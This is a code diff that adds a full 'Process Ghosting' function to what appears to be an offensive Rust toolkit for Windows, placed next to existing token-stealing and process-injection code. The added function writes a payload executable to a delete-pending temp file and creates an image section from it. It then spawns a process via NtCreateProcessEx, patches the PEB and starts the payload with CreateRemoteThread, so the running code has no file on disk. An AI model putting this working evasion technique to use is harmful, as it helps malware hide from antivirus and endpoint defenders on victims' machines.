@@ -6,8 +6,12 @@ use std::path::Path;
 
 use ntapi::ntpsapi::{NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION};
 use ntapi::ntmmapi::NtUnmapViewOfSection;
-use windows::core::PCSTR;
+use windows::core::{PCSTR, PCWSTR};
 use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
+use windows::Win32::Storage::FileSystem::{
+    CreateFileW, WriteFile, FILE_SHARE_READ, FILE_SHARE_WRITE, CREATE_ALWAYS,
+    FILE_FLAGS_AND_ATTRIBUTES,
+};
 use windows::Win32::System::Diagnostics::Debug::{
     GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
     CONTEXT_FULL_AMD64,
@@ -17,16 +21,16 @@ use windows::Win32::System::Diagnostics::ToolHelp::{
 };
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows::Win32::System::Memory::{
-    VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_DECOMMIT, MEM_RELEASE, MEM_RESERVE,
-    PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+    CreateFileMappingW, VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_DECOMMIT, MEM_RELEASE,
+    MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
 };
 use windows::Win32::System::Threading::{
-    CreateProcessAsUserW, CreateProcessW, CreateRemoteThread, OpenProcess, OpenThread,
-    OpenProcessToken, QueueUserAPC, ResumeThread, SuspendThread, TerminateProcess,
-    WaitForSingleObject, CREATE_SUSPENDED, PROCESS_ALL_ACCESS, PROCESS_CREATE_THREAD,
-    PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION,
-    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW, THREAD_GET_CONTEXT,
-    THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
+    CreateProcessAsUserW, CreateProcessW, CreateRemoteThread, GetCurrentProcess, GetProcessId,
+    OpenProcess, OpenThread, OpenProcessToken, QueueUserAPC, ResumeThread, SuspendThread,
+    TerminateProcess, WaitForSingleObject, CREATE_SUSPENDED, PROCESS_ALL_ACCESS,
+    PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
+    PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
+    STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
 };
 use windows::Win32::Security::{
     AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
@@ -70,6 +74,10 @@ pub enum MiscError {
     NtUnmapFailed,
     PebReadFailed,
     ArchMismatch(String),
+    GhostFileFailed(String),
+    GhostSectionFailed,
+    GhostNtCreateProcessFailed,
+    GhostSetupFailed(String),
 }
 
 impl fmt::Display for MiscError {
@@ -118,6 +126,10 @@ impl fmt::Display for MiscError {
             MiscError::NtUnmapFailed => write!(f, "NtUnmapViewOfSection failed"),
             MiscError::PebReadFailed => write!(f, "Failed to read/write PEB"),
             MiscError::ArchMismatch(msg) => write!(f, "Architecture mismatch: {}", msg),
+            MiscError::GhostFileFailed(msg) => write!(f, "Ghost file operation failed: {}", msg),
+            MiscError::GhostSectionFailed => write!(f, "Failed to create image section from ghost file"),
+            MiscError::GhostNtCreateProcessFailed => write!(f, "NtCreateProcessEx failed"),
+            MiscError::GhostSetupFailed(msg) => write!(f, "Ghost process setup failed: {}", msg),
         }
     }
 }
@@ -1969,5 +1981,414 @@ pub fn steal_token(pid: u32, exe_path: &str, args: &str) -> Result<(u32, u32), M
         let _ = CloseHandle(process_handle);
 
         Ok((new_pid, new_tid))
+    }
+}
+
+/// Process Ghosting: create a process whose backing file no longer exists on disk.
+///
+/// Algorithm:
+/// 1. Read payload PE into memory
+/// 2. Create temp file, mark it for deletion via NtSetInformationFile
+/// 3. Write payload bytes to the file
+/// 4. Create image section via CreateFileMappingW(SEC_IMAGE)
+/// 5. Close file handle (triggers deletion), section survives
+/// 6. Create process from section via NtCreateProcessEx
+/// 7. Set up PEB, process parameters, and create initial thread
+///
+/// Returns the PID of the ghosted process on success.
+///
+/// # Arguments
+/// * `exe_path` - Path to the payload executable (64-bit PE)
+pub fn ghost_process(exe_path: &str) -> Result<u32, MiscError> {
+    // Validate executable exists
+    if !Path::new(exe_path).exists() {
+        return Err(MiscError::FileNotFound(exe_path.to_string()));
+    }
+
+    // Read payload PE file
+    let data = std::fs::read(exe_path)
+        .map_err(|_| MiscError::FileReadFailed(exe_path.to_string()))?;
+
+    // Validate PE header basics
+    if data.len() < 64 {
+        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
+    }
+    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
+    if dos_magic != 0x5A4D {
+        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
+    }
+    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
+    if data.len() < pe_offset + 4 {
+        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
+    }
+    let pe_sig = u32::from_le_bytes([
+        data[pe_offset],
+        data[pe_offset + 1],
+        data[pe_offset + 2],
+        data[pe_offset + 3],
+    ]);
+    if pe_sig != 0x00004550 {
+        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
+    }
+
+    // Check PE32+ (64-bit)
+    let coff_offset = pe_offset + 4;
+    if data.len() < coff_offset + 20 {
+        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
+    }
+    let opt_offset = coff_offset + 20;
+    if data.len() < opt_offset + 2 {
+        return Err(MiscError::InvalidPE("File too small for optional header".into()));
+    }
+    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
+    if opt_magic != 0x20b {
+        return Err(MiscError::ArchMismatch(
+            "Only PE32+ (64-bit) executables are supported for ghosting".into(),
+        ));
+    }
+
+    unsafe {
+        // Resolve ntdll functions dynamically
+        let ntdll_name = CString::new("ntdll.dll").unwrap();
+        let ntdll = GetModuleHandleA(PCSTR(ntdll_name.as_ptr() as *const u8))
+            .map_err(|_| MiscError::GhostSetupFailed("Failed to get ntdll.dll handle".into()))?;
+
+        let fn_name_set_info = CString::new("NtSetInformationFile").unwrap();
+        let nt_set_information_file = GetProcAddress(ntdll, PCSTR(fn_name_set_info.as_ptr() as *const u8))
+            .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve NtSetInformationFile".into()))?;
+
+        let fn_name_create_proc = CString::new("NtCreateProcessEx").unwrap();
+        let nt_create_process_ex = GetProcAddress(ntdll, PCSTR(fn_name_create_proc.as_ptr() as *const u8))
+            .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve NtCreateProcessEx".into()))?;
+
+        let fn_name_create_params = CString::new("RtlCreateProcessParametersEx").unwrap();
+        let rtl_create_process_parameters_ex = GetProcAddress(ntdll, PCSTR(fn_name_create_params.as_ptr() as *const u8))
+            .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve RtlCreateProcessParametersEx".into()))?;
+
+        // Type definitions for NT API functions
+        type NtSetInformationFileFn = unsafe extern "system" fn(
+            HANDLE, *mut [u64; 2], *mut u8, u32, u32,
+        ) -> i32;
+
+        type NtCreateProcessExFn = unsafe extern "system" fn(
+            *mut HANDLE, u32, *mut std::ffi::c_void, HANDLE, u32, HANDLE, HANDLE, HANDLE, u8,
+        ) -> i32;
+
+        #[repr(C)]
+        struct UnicodeString {
+            length: u16,
+            maximum_length: u16,
+            buffer: *mut u16,
+        }
+
+        type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
+            *mut *mut u8, *mut UnicodeString, *mut UnicodeString, *mut UnicodeString, *mut UnicodeString,
+            *mut std::ffi::c_void, *mut UnicodeString, *mut UnicodeString, *mut UnicodeString, *mut UnicodeString, u32,
+        ) -> i32;
+
+        let nt_set_information_file: NtSetInformationFileFn = std::mem::transmute(nt_set_information_file);
+        let nt_create_process_ex: NtCreateProcessExFn = std::mem::transmute(nt_create_process_ex);
+        let rtl_create_process_parameters_ex: RtlCreateProcessParametersExFn = std::mem::transmute(rtl_create_process_parameters_ex);
+
+        // Step 1: Create temp file
+        let temp_path = std::env::temp_dir().join("GhostPE.tmp");
+        let temp_path_str = temp_path.to_string_lossy().to_string();
+        let temp_wide: Vec<u16> = temp_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+
+        let file_handle = CreateFileW(
+            PCWSTR(temp_wide.as_ptr()),
+            0x1F01FF, // FILE_ALL_ACCESS
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            None,
+            CREATE_ALWAYS,
+            FILE_FLAGS_AND_ATTRIBUTES(0),
+            None,
+        ).map_err(|_| MiscError::GhostFileFailed("CreateFileW failed".into()))?;
+
+        // Step 2: Mark file for deletion via NtSetInformationFile(FileDispositionInformation)
+        let mut io_status_block: [u64; 2] = [0; 2];
+        let mut delete_flag: u8 = 1; // DeleteFile = TRUE
+        let status = nt_set_information_file(
+            file_handle,
+            &mut io_status_block,
+            &mut delete_flag,
+            1, // sizeof(FILE_DISPOSITION_INFORMATION)
+            13, // FileDispositionInformation
+        );
+
+        if status != 0 {
+            let _ = CloseHandle(file_handle);
+            return Err(MiscError::GhostFileFailed(format!(
+                "NtSetInformationFile failed with status 0x{:08X}", status
+            )));
+        }
+
+        // Step 3: Write payload bytes to the file
+        let mut bytes_written: u32 = 0;
+        let write_result = WriteFile(
+            file_handle,
+            Some(&data),
+            Some(&mut bytes_written),
+            None,
+        );
+
+        if write_result.is_err() {
+            let _ = CloseHandle(file_handle);
+            return Err(MiscError::GhostFileFailed("WriteFile failed".into()));
+        }
+
+        // Step 4: Create image section (SEC_IMAGE | PAGE_EXECUTE_READ)
+        let section_handle = CreateFileMappingW(
+            file_handle,
+            None,
+            PAGE_PROTECTION_FLAGS(0x01000020), // SEC_IMAGE (0x01000000) | PAGE_EXECUTE_READ (0x20)
+            0,
+            0,
+            None,
+        ).map_err(|_| MiscError::GhostSectionFailed)?;
+
+        // Step 5: Close file handle - triggers deletion, section survives
+        let _ = CloseHandle(file_handle);
+
+        // Step 6: Create process from section via NtCreateProcessEx
+        let mut process_handle = HANDLE::default();
+        let status = nt_create_process_ex(
+            &mut process_handle,
+            0x001FFFFF, // PROCESS_ALL_ACCESS
+            std::ptr::null_mut(),
+            GetCurrentProcess(),
+            4, // PS_INHERIT_HANDLES
+            section_handle,
+            HANDLE::default(), // DebugPort
+            HANDLE::default(), // ExceptionPort
+            0, // InJob = FALSE
+        );
+
+        let _ = CloseHandle(section_handle);
+
+        if status != 0 {
+            return Err(MiscError::GhostNtCreateProcessFailed);
+        }
+
+        let pid = GetProcessId(process_handle);
+
+        // Step 7: Query PEB address
+        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
+        let mut return_length: u32 = 0;
+        let status = NtQueryInformationProcess(
+            process_handle.0 as *mut _,
+            ProcessBasicInformation,
+            &mut pbi as *mut _ as *mut _,
+            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+            &mut return_length,
+        );
+
+        if status != 0 {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::NtQueryFailed);
+        }
+
+        let peb_address = pbi.PebBaseAddress as u64;
+
+        // Step 8: Read PEB.ImageBaseAddress (offset 0x10)
+        let mut image_base: u64 = 0;
+        if ReadProcessMemory(
+            process_handle,
+            (peb_address + 0x10) as *const _,
+            &mut image_base as *mut _ as *mut _,
+            8,
+            None,
+        ).is_err() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::PebReadFailed);
+        }
+
+        // Step 9: Read remote PE header to get entry point RVA
+        let mut pe_header = vec![0u8; 4096];
+        if ReadProcessMemory(
+            process_handle,
+            image_base as *const _,
+            pe_header.as_mut_ptr() as *mut _,
+            pe_header.len(),
+            None,
+        ).is_err() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::ReadFailed);
+        }
+
+        // Parse entry point from remote PE header
+        let remote_pe_offset = u32::from_le_bytes([
+            pe_header[60], pe_header[61], pe_header[62], pe_header[63],
+        ]) as usize;
+        let remote_opt_offset = remote_pe_offset + 4 + 20;
+        if pe_header.len() < remote_opt_offset + 20 {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::InvalidPE("Remote PE header too small".into()));
+        }
+        let entry_point_rva = u32::from_le_bytes([
+            pe_header[remote_opt_offset + 16],
+            pe_header[remote_opt_offset + 17],
+            pe_header[remote_opt_offset + 18],
+            pe_header[remote_opt_offset + 19],
+        ]) as u64;
+
+        // Step 10: Create process parameters via RtlCreateProcessParametersEx
+        // Build UNICODE_STRING structs for image path and command line
+        // Use the temp file path as the display path
+        let display_path_wide: Vec<u16> = temp_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let byte_len = ((display_path_wide.len() - 1) * 2) as u16;
+        let max_len = byte_len + 2;
+
+        let mut image_path_us = UnicodeString {
+            length: byte_len,
+            maximum_length: max_len,
+            buffer: display_path_wide.as_ptr() as *mut u16,
+        };
+
+        // Current directory
+        let cur_dir_str = std::env::current_dir()
+            .unwrap_or_else(|_| std::path::PathBuf::from("C:\\"))
+            .to_string_lossy()
+            .to_string();
+        let cur_dir_wide: Vec<u16> = cur_dir_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let cur_dir_byte_len = ((cur_dir_wide.len() - 1) * 2) as u16;
+        let cur_dir_max = cur_dir_byte_len + 2;
+
+        let mut cur_dir_us = UnicodeString {
+            length: cur_dir_byte_len,
+            maximum_length: cur_dir_max,
+            buffer: cur_dir_wide.as_ptr() as *mut u16,
+        };
+
+        // Command line = same as image path
+        let mut cmd_line_us = UnicodeString {
+            length: image_path_us.length,
+            maximum_length: image_path_us.maximum_length,
+            buffer: image_path_us.buffer,
+        };
+
+        let mut process_params: *mut u8 = std::ptr::null_mut();
+        let status = rtl_create_process_parameters_ex(
+            &mut process_params,
+            &mut image_path_us,     // ImagePathName
+            std::ptr::null_mut(),   // DllPath
+            &mut cur_dir_us,        // CurrentDirectory
+            &mut cmd_line_us,       // CommandLine
+            std::ptr::null_mut(),   // Environment
+            std::ptr::null_mut(),   // WindowTitle
+            std::ptr::null_mut(),   // DesktopInfo
+            std::ptr::null_mut(),   // ShellInfo
+            std::ptr::null_mut(),   // RuntimeData
+            1, // RTL_USER_PROC_PARAMS_NORMALIZED
+        );
+
+        if status != 0 || process_params.is_null() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::GhostSetupFailed(format!(
+                "RtlCreateProcessParametersEx failed with status 0x{:08X}", status
+            )));
+        }
+
+        // Step 11: Calculate total size (MaximumLength + EnvironmentSize)
+        // MaximumLength is at offset 0x00 (u32)
+        let max_length = std::ptr::read_unaligned(process_params as *const u32) as usize;
+        // EnvironmentSize is at offset 0x3F0 (usize on x64)
+        let env_size = std::ptr::read_unaligned(process_params.add(0x3F0) as *const usize);
+        let total_params_size = max_length + env_size;
+
+        // Step 12: Allocate memory in remote process for process parameters
+        let remote_params = VirtualAllocEx(
+            process_handle,
+            Some(std::ptr::null()),
+            total_params_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if remote_params.is_null() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::AllocFailed);
+        }
+
+        let remote_base = remote_params as u64;
+        let local_base = process_params as u64;
+
+        // Relocate pointer fields in the process parameters
+        // Helper: relocate a pointer at a given offset within the params struct
+        let relocate = |offset: usize| {
+            let ptr_val = std::ptr::read_unaligned(process_params.add(offset) as *const u64);
+            if ptr_val != 0 {
+                let relocated = remote_base + (ptr_val - local_base);
+                std::ptr::write_unaligned(process_params.add(offset) as *mut u64, relocated);
+            }
+        };
+
+        // Relocate all UNICODE_STRING Buffer pointers and Environment pointer
+        relocate(0x40);  // CurrentDirectory.DosPath.Buffer
+        relocate(0x58);  // DllPath.Buffer
+        relocate(0x68);  // ImagePathName.Buffer
+        relocate(0x78);  // CommandLine.Buffer
+        relocate(0x80);  // Environment
+        relocate(0xB8);  // WindowTitle.Buffer
+        relocate(0xC8);  // DesktopInfo.Buffer
+        relocate(0xD8);  // ShellInfo.Buffer
+        relocate(0xE8);  // RuntimeData.Buffer
+
+        // Write relocated process parameters to remote process
+        if WriteProcessMemory(
+            process_handle,
+            remote_params,
+            process_params as *const _,
+            total_params_size,
+            None,
+        ).is_err() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::WriteFailed);
+        }
+
+        // Step 13: Update PEB.ProcessParameters (offset 0x20) to point to remote params
+        let remote_params_ptr = remote_params as u64;
+        if WriteProcessMemory(
+            process_handle,
+            (peb_address + 0x20) as *mut _,
+            &remote_params_ptr as *const _ as *const _,
+            8,
+            None,
+        ).is_err() {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            return Err(MiscError::PebReadFailed);
+        }
+
+        // Step 14: Create remote thread at ImageBase + EntryPointRVA
+        let entry_point_addr = image_base + entry_point_rva;
+        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
+            std::mem::transmute(entry_point_addr);
+
+        let thread_handle = CreateRemoteThread(
+            process_handle,
+            None,
+            0,
+            Some(thread_start),
+            Some(image_base as *const _), // pass ImageBase as context
+            0,
+            None,
+        ).map_err(|_| {
+            let _ = TerminateProcess(process_handle, 1);
+            let _ = CloseHandle(process_handle);
+            MiscError::CreateRemoteThreadFailed
+        })?;
+
+        let _ = CloseHandle(thread_handle);
+        let _ = CloseHandle(process_handle);
+
+        Ok(pid)
     }
 }
